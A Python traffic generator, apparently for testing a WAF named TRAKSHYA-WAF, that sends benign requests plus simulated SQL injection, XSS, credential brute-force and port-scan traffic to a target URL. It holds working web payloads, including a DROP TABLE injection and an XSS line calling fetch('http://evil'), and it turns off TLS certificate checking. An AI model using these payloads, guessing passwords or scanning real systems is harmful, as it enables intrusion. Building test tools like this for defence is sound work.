#!/usr/bin/env python3
"""
TRAKSHYA-WAF Traffic Generator

Generates normal HTTP traffic and simulated attacks against
the WAF proxy (default: http://localhost:8080).

Usage:
    python3 scripts/traffic-generator.py --target http://localhost:8080 --mode all
"""

import argparse
import random
import time
import urllib.parse
import urllib.request
import ssl

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "curl/8.4.0",
    "python-requests/2.31.0",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/115.0",
]

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def req(url, method="GET", data=None, headers=None, timeout=10):
    headers = headers or {}
    body = None
    if data is not None:
        body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return str(e)


def normal_traffic(base, count=25):
    paths = ["/", "/about", "/contact", "/api/health", "/login", "/dashboard"]
    for _ in range(count):
        p = random.choice(paths)
        url = f"{base}{p}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        status = req(url, "GET", headers=headers)
        print(f"[normal] GET {url} -> {status}")
        time.sleep(random.uniform(0.05, 0.25))


def sqli_attacks(base, count=10):
    payloads = [
        "' OR '1'='1",
        "UNION SELECT NULL,NULL,NULL-- ",
        "1'; DROP TABLE users;--",
        "' AND 1=SLEEP(5)--",
        "admin'--",
        "' OR EXISTS(SELECT * FROM users)--",
    ]
    for _ in range(count):
        p = random.choice(["/login", "/search", "/api/users", "/api/query"])
        q = urllib.parse.quote(random.choice(payloads))
        url = f"{base}{p}?q={q}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        status = req(url, "GET", headers=headers)
        print(f"[sqli] GET {url} -> {status}")
        time.sleep(random.uniform(0.05, 0.2))


def xss_attacks(base, count=10):
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=fetch('http://evil')>",
        "javascript:alert(document.cookie)",
        "<body onload=alert(1)>",
    ]
    for _ in range(count):
        p = random.choice(["/search", "/contact", "/feedback", "/comment"])
        q = urllib.parse.quote(random.choice(payloads))
        url = f"{base}{p}?q={q}"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        status = req(url, "GET", headers=headers)
        print(f"[xss] GET {url} -> {status}")
        time.sleep(random.uniform(0.05, 0.2))


def brute_force(base, count=20):
    usernames = ["admin", "root", "test", "user", "administrator"]
    passwords = ["123456", "password", "admin123", "root", "test123"]
    for _ in range(count):
        u = random.choice(usernames)
        p = random.choice(passwords)
        url = f"{base}/login"
        data = {"username": u, "password": p}
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        status = req(url, "POST", data=data, headers=headers)
        print(f"[brute] POST /login username={u} password={p} -> {status}")
        time.sleep(random.uniform(0.02, 0.1))


def port_scan(base, count=30):
    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 1723, 3306, 3389, 5432, 5900, 8080, 8443]
    host = urllib.parse.urlparse(base).hostname or "localhost"
    for port in ports[:count]:
        url = f"http://{host}:{port}/"
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        status = req(url, "GET", headers=headers, timeout=2)
        print(f"[scan] GET {url} -> {status}")
        time.sleep(random.uniform(0.02, 0.1))


def main():
    parser = argparse.ArgumentParser(description="TRAKSHYA-WAF traffic generator")
    parser.add_argument("--target", default="http://localhost:8080", help="WAF proxy base URL")
    parser.add_argument("--mode", default="all", choices=["all", "normal", "sqli", "xss", "brute", "scan"])
    parser.add_argument("--count", type=int, default=25, help="Request count per mode")
    args = parser.parse_args()

    base = args.target.rstrip("/")
    print(f"Target: {base}")
    print(f"Mode: {args.mode}")

    start = time.time()
    if args.mode in ("all", "normal"):
        normal_traffic(base, args.count)
    if args.mode in ("all", "sqli"):
        sqli_attacks(base, max(5, args.count // 2))
    if args.mode in ("all", "xss"):
        xss_attacks(base, max(5, args.count // 2))
    if args.mode in ("all", "brute"):
        brute_force(base, args.count)
    if args.mode in ("all", "scan"):
        port_scan(base, args.count)
    elapsed = time.time() - start
    print(f"Done in {elapsed:.2f}s")


if __name__ == "__main__":
    main()
